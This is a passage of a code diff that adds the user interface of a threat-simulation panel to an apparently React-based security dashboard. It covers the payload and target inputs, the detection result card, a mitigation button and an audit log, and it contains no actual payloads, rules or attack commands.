+                    key={preset.label}
+                    type="button"
+                    className="filter-chip"
+                    onClick={() => {
+                      setSimTarget(preset.target)
+                      setSimPayload(preset.payload)
+                      setSimResult(null)
+                      setSimSolved(false)
+                    }}
+                  >
+                    {preset.label}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            <form onSubmit={handleSimulate} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+              <div>
+                <label style={{ display: 'block', fontSize: '10px', fontWeight: 600, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '4px' }}>
+                  Target Address / Endpoint
+                </label>
+                <div className="search-input-wrap" style={{ width: '100%' }}>
+                  <input
+                    type="text"
+                    value={simTarget}
+                    onChange={(e) => setSimTarget(e.target.value)}
+                    placeholder="https://bytecodx.internal/api/v1/resource"
+                    required
+                  />
+                </div>
+              </div>
+
+              <div>
+                <label style={{ display: 'block', fontSize: '10px', fontWeight: 600, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '4px' }}>
+                  Raw Payload / Threat Pattern
+                </label>
+                <textarea
+                  rows={4}
+                  value={simPayload}
+                  onChange={(e) => setSimPayload(e.target.value)}
+                  placeholder="Enter SQLi, RCE, XSS, Path Traversal payload, or port reconnaissance command..."
+                  style={{
+                    width: '100%',
+                    padding: '10px',
+                    borderRadius: '6px',
+                    border: '1px solid var(--line)',
+                    background: 'var(--panel)',
+                    color: 'var(--ink)',
+                    fontSize: '11px',
+                    fontFamily: 'monospace',
+                    outline: 'none',
+                    boxSizing: 'border-box',
+                  }}
+                  required
+                />
+              </div>
+
+              <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-start' }}>
+                <button type="submit" className="primary-button" disabled={simLoading}>
+                  {simLoading ? <LoaderCircle className="spinning" size={14} /> : <Search size={14} />}
+                  <span>{simLoading ? 'Analyzing threat vector…' : 'Analyze & Detect Threat'}</span>
+                </button>
+              </div>
+            </form>
+          </div>
+
+          {simResult && (
+            <motion.div
+              className="panel"
+              initial={{ opacity: 0, y: 8 }}
+              animate={{ opacity: 1, y: 0 }}
+              style={{
+                borderLeft: simResult.attackStage === 'ACTIVE_ATTACK'
+                  ? '4px solid #ff5252'
+                  : simResult.attackStage === 'PRE_ATTACK'
+                  ? '4px solid #ffb300'
+                  : '4px solid #4caf50',
+                padding: '20px',
+              }}
+            >
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
+                <div>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
+                    {simResult.attackStage === 'ACTIVE_ATTACK' && (
+                      <span className="stage-tag active">ACTIVE ATTACK DETECTED (WHILE ATTACK)</span>
+                    )}
+                    {simResult.attackStage === 'PRE_ATTACK' && (
+                      <span className="stage-tag pre">PRE-ATTACK RECONNAISSANCE (BEFORE ATTACK)</span>
+                    )}
+                    {simResult.attackStage === 'BENIGN' && (
+                      <span className="stage-tag solved">BENIGN TRAFFIC</span>
+                    )}
+                    <span className="status-badge critical">{simResult.severity}</span>
+                    <span style={{ fontSize: '10px', color: 'var(--muted)', fontFamily: 'monospace' }}>
+                      Rule: {simResult.detectionRule}
+                    </span>
+                  </div>
+                  <h3 style={{ margin: '0 0 4px', fontSize: '15px' }}>{simResult.title}</h3>
+                  <p style={{ margin: 0, fontSize: '11px', color: 'var(--muted)' }}>{simResult.impact}</p>
+                </div>
+
+                {simResult.attackStage !== 'BENIGN' && !simSolved && (
+                  <button
+                    type="button"
+                    className="primary-button"
+                    style={{ background: '#5965ed' }}
+                    onClick={handleSolveSimulator}
+                    disabled={simSolving}
+                  >
+                    {simSolving ? <LoaderCircle className="spinning" size={14} /> : <Zap size={14} />}
+                    <span>{simSolving ? 'Mitigating…' : '⚡ Solve Threat (Deploy Defense)'}</span>
+                  </button>
+                )}
+              </div>
+
+              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px', marginTop: '14px', padding: '10px', background: 'var(--soft)', borderRadius: '6px', fontSize: '11px' }}>
+                <div><strong>Signature:</strong> <code>{simResult.detectionRule}</code></div>
+                <div><strong>Attacker IP:</strong> <code style={{ color: '#d32f2f' }}>{simResult.attackerIp}</code></div>
+                <div><strong>Target:</strong> <code>{simResult.targetEndpoint}</code></div>
+                <div><strong>Recommended Action:</strong> <code>{simResult.mitigationAction}</code></div>
+              </div>
+
+              {simSolved && (
+                <div style={{ marginTop: '16px' }}>
+                  <div style={{ padding: '10px 14px', background: '#e8f5e9', border: '1px solid #c8e6c9', borderRadius: '6px', color: '#2e7d32', fontSize: '11px', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px' }}>
+                    <ShieldCheck size={18} />
+                    <strong>Threat Neutralized:</strong> Attacker IP {simResult.attackerIp} blacklisted at firewall. Virtual patch and source fixes deployed successfully.
+                  </div>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                    <span style={{ fontSize: '10px', fontWeight: 600, color: '#2e7d32', textTransform: 'uppercase' }}>
+                      Remediation & Defense Code
+                    </span>
+                    <button
+                      type="button"
+                      className="filter-chip"
+                      style={{ fontSize: '9px', padding: '2px 8px' }}
+                      onClick={() => handleCopy('sim-code', simResult.solutionCode)}
+                    >
+                      {copiedId === 'sim-code' ? 'Copied!' : 'Copy Code'}
+                    </button>
+                  </div>
+                  <pre className="code-solution-box">{simResult.solutionCode}</pre>
+                </div>
+              )}
+            </motion.div>
+          )}
+
+          <div className="panel" style={{ padding: '16px' }}>
+            <h4 style={{ margin: '0 0 10px', fontSize: '12px' }}>Intrusion Defense Audit Trail</h4>
+            <div style={{ background: '#121420', padding: '12px', borderRadius: '6px', maxHeight: '160px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '10px', color: '#90a4ae', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+              {simLog.map((log, idx) => (
+                <div key={idx} style={{ color: log.includes('SOLVED') ? '#81c784' : log.includes('ACTIVE') ? '#ff8a80' : '#b0bec5' }}>
+                  {log}
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
     </section>
   )
 }
